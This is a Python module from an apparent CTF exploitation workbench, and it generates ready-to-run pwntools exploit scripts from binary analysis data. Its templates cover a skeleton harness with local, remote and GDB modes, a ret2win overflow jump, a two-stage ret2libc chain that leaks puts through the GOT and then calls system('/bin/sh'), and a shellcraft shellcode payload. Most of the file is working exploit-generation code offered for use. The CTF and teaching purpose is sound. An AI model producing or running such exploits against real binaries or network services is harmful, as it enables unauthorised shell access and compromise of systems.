"""Exploit script generator (Step 9 A).

Produces a ready-to-run pwntools script from the state the workbench already
knows: target, checksec, libc, gadgets, crash offset. Three templates cover
most CTF pwn openings:

* ``skeleton`` — clean pwntools harness (local/remote, helpers, checksec notes)
* ``ret2win``  — fixed-offset jump to a win/flag function
* ``ret2libc`` — puts leak → libc base → system("/bin/sh") with stack alignment
* ``shellcode``— NX-off / mprotect shellcode payload

Pure engine: no Qt, no pwntools import. The generated script is Python and is
syntax-checked in the test-suite.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

TEMPLATES = ("skeleton", "ret2win", "ret2libc", "shellcode")

# Function names that usually mean "free win" in CTF binaries.
_WIN_RE = re.compile(r"(^|_)(win|flag|shell|backdoor|secret|get_flag|print_flag)($|_)", re.I)

_ARCH_MAP = {
    "x86_64": "amd64",
    "x86": "i386",
    "aarch64": "aarch64",
    "arm": "arm",
    "mips": "mips",
    "mips64": "mips64",
    "riscv64": "riscv64",
    "riscv32": "riscv32",
    "ppc64": "powerpc64",
    "ppc": "powerpc",
}


@dataclass
class ExploitContext:
    """Everything a template may interpolate. All fields are optional."""

    binary_path: str = ""
    binary_name: str = ""
    arch: str = "amd64"
    bits: int = 64
    endianness: str = "little"
    fmt: str = "ELF"
    checksec: dict[str, str] = field(default_factory=dict)
    functions: dict[str, int] = field(default_factory=dict)
    libc_path: str = ""
    libc_version: str = ""
    libc_symbols: dict[str, int] = field(default_factory=dict)
    libc_binsh: int | None = None
    libc_one_gadgets: list[str] = field(default_factory=list)
    gadgets: dict[str, int] = field(default_factory=dict)
    crash_offset: int | None = None
    host: str = "127.0.0.1"
    port: int = 1337

    @classmethod
    def from_model(cls, model: Any) -> ExploitContext:
        """Build a context from a parsed :class:`BinaryModel`."""
        checksec: dict[str, str] = {}
        for item in getattr(model, "checksec", []) or []:
            checksec[str(getattr(item, "name", ""))] = str(getattr(item, "status", ""))
        functions: dict[str, int] = {}
        for symbol in getattr(model, "symbols", []) or []:
            name = str(getattr(symbol, "name", ""))
            value = int(getattr(symbol, "value", 0) or 0)
            if name and value:
                functions[name] = value
        for name in getattr(model, "imports", []) or []:
            functions.setdefault(str(name), 0)
        return cls(
            binary_path=str(getattr(model, "path", "")),
            binary_name=str(getattr(model, "name", "")),
            arch=_ARCH_MAP.get(str(getattr(model, "arch", "")).lower(), str(getattr(model, "arch", "amd64"))),
            bits=int(getattr(model, "bits", 64) or 64),
            endianness=str(getattr(model, "endianness", "little") or "little"),
            fmt=str(getattr(model, "fmt", "ELF") or "ELF"),
            checksec=checksec,
            functions=functions,
        )

    def win_function(self) -> tuple[str, int] | None:
        for name, address in self.functions.items():
            if address and _WIN_RE.search(name):
                return name, address
        for preferred in ("win", "flag", "print_flag", "get_flag", "shell"):
            value = self.functions.get(preferred)
            if value:
                return preferred, value
        return None

    def checksec_comment(self) -> str:
        if not self.checksec:
            return "# checksec: not collected"
        parts = [f"{name.lower().replace(' ', '')}={status}" for name, status in self.checksec.items()]
        return "# checksec: " + " ".join(parts)


def _quote(text: str) -> str:
    return repr(str(text))


def _offset(ctx: ExploitContext) -> int:
    return int(ctx.crash_offset) if ctx.crash_offset else 0


def _header(ctx: ExploitContext) -> str:
    return (
        "#!/usr/bin/env python3\n"
        f"# Exploit generated by 80PWNER — by The 80\n"
        f"# Target: {ctx.binary_path or ctx.binary_name or 'unknown'}\n"
        f"{ctx.checksec_comment()}\n"
        f"# arch={ctx.arch} bits={ctx.bits} endian={ctx.endianness}"
        + (f" libc={ctx.libc_version}" if ctx.libc_version else "")
        + "\n"
    )


_COMMON_PRELUDE = '''\
from pwn import *

exe = context.binary = ELF({bin_expr}, checksec=False)
context.log_level = "info"
{libc_line}
HOST, PORT = {host!r}, {port}

io = None


def start(argv=(), **kw):
    """Local process by default; `python x.py REMOTE` hits the remote."""
    global io
    if args.REMOTE:
        io = remote(HOST, PORT)
    elif args.GDB:
        io = gdb.debug({bin_expr}, gdbscript="b main\\nc", argv=argv, **kw)
    else:
        io = process({bin_expr}, argv=argv, **kw)
    return io


def sla(delim, data):
    return io.sendlineafter(delim, data)


def sa(delim, data):
    return io.sendafter(delim, data)


def sl(data):
    return io.sendline(data)


def ru(n):
    return io.recv(n)


def lg(name, value):
    log.success(f"{{name}} = {{value:#x}}")
    return value
'''


def generate(ctx: ExploitContext, template: str = "skeleton") -> str:
    """Render *template* for *ctx*. Raises ``ValueError`` for unknown names."""
    template = template.lower().strip()
    if template not in TEMPLATES:
        raise ValueError(f"Unknown template {template!r} — choose from {', '.join(TEMPLATES)}")
    functions = {name: address for name, address in ctx.functions.items() if address}
    bin_expr = _quote(ctx.binary_path or ctx.binary_name or "./chall")
    libc_line = (
        f"libc = ELF({_quote(ctx.libc_path)}, checksec=False)"
        if ctx.libc_path
        else "libc = None  # load the target libc here: libc = ELF('./libc.so.6')"
    )
    prelude = _COMMON_PRELUDE.format(
        bin_expr=bin_expr, libc_line=libc_line, host=ctx.host, port=ctx.port
    )
    if template == "skeleton":
        body = _skeleton_body(ctx, functions)
    elif template == "ret2win":
        body = _ret2win_body(ctx)
    elif template == "ret2libc":
        body = _ret2libc_body(ctx)
    else:
        body = _shellcode_body(ctx)
    return _header(ctx) + "\n" + prelude + "\n" + body


def _skeleton_body(ctx: ExploitContext, functions: dict[str, int]) -> str:
    info = []
    for name, address in sorted(functions.items()):
        if name in ("main", "_start") or name.startswith("__"):
            continue
        if len(info) >= 12:
            break
        info.append(f"#   {name:<28} {address:#x}")
    symbols = "\n".join(info)
    libc_note = ""
    if ctx.libc_symbols:
        wanted = ("system", "puts", "printf", "read", "write")
        rows = [
            f"#   {name:<12} {ctx.libc_symbols[name]:#x}"
            for name in wanted
            if ctx.libc_symbols.get(name)
        ]
        if rows:
            libc_note = "\n# libc offsets:\n" + "\n".join(rows) + "\n"
    return f'''# Handy targets:
{symbols or "#   (no named symbols in this binary)"}
{libc_note}
def exploit():
    io = start()
    # TODO: drive the program. Common first steps:
    #   io.recvuntil(b"Enter input: ")
    #   payload = flat({{ {_offset(ctx) or 0}: p64(0xdeadbeef) }})
    #   io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
'''


def _ret2win_body(ctx: ExploitContext) -> str:
    win = ctx.win_function()
    offset = _offset(ctx)
    if win is None:
        target_line = (
            "# TODO: no win/flag symbol found — replace with the address or function name\n"
            "WIN = 0x0  # e.g. exe.sym['win']"
        )
    else:
        name, address = win
        target_line = f"WIN = exe.sym[{name!r}]  # {name} @ {address:#x}"
    if offset:
        build = "    payload = flat({ OFFSET: [alignment, p64(target)] })"
    else:
        build = (
            "    payload = b\"A\" * OFFSET + alignment + p64(target)"
            "  # OFFSET=0 — fill in after a crash"
        )
    return f'''{target_line}
OFFSET = {offset or 0}  # crash offset from the Pattern Tool
RET = 0x0  # optional stack-alignment `ret` gadget (movaps crash)

def exploit():
    io = start()
    target = WIN
    # If the win function calls into libc/printf, a bare jump can crash on
    # movaps: prepend a `ret` gadget (set RET to a plain "ret" address).
    alignment = p64(RET) if RET else b""
{build}
    io.sendlineafter(b": ", payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
'''


def _ret2libc_body(ctx: ExploitContext) -> str:
    offset = _offset(ctx)
    one_gadget_note = ""
    if ctx.libc_one_gadgets:
        one_gadget_note = (
            "\n# one-gadget candidates found by 80PWNER (verify constraints):\n"
            + "\n".join(f"#   {line}" for line in ctx.libc_one_gadgets[:5])
            + "\n"
        )
    return f'''OFFSET = {offset or 0}  # crash offset from the Pattern Tool
{one_gadget_note}
def exploit():
    io = start()

    # --- stage 1: leak a resolved libc address through puts(GOT) ----------
    rop = ROP(exe)
    rop.puts(exe.got["puts"])
    rop.call(exe.entry)          # return to _start and replay the bug
    payload = flat({{ OFFSET: rop.chain() }})
    io.sendlineafter(b": ", payload)

    leaked = u64(io.recvline().strip().ljust(8, b"\\x00"))
    lg("puts", leaked)
    libc.address = leaked - libc.sym["puts"]
    lg("libc base", libc.address)

    # --- stage 2: system("/bin/sh") ------------------------------------
    rop2 = ROP(libc)
    rop2.system(next(libc.search(b"/bin/sh")))
    payload = flat({{ OFFSET: rop2.chain() }})
    io.sendlineafter(b": ", payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
'''


def _shellcode_body(ctx: ExploitContext) -> str:
    offset = _offset(ctx)
    nx = ctx.checksec.get("NX", "").lower()
    note = (
        "# NX is enabled — this only works after an mprotect() call or in a JIT/exec region."
        if nx == "enabled"
        else "# NX appears disabled/unknown — verify with checksec before trusting this."
    )
    return f'''context.arch = {ctx.arch!r}
{note}
OFFSET = {offset or 0}

def exploit():
    io = start()
    sc = asm(shellcraft.sh())
    lg("shellcode length", len(sc))
    payload = flat({{ OFFSET: sc }})
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
'''
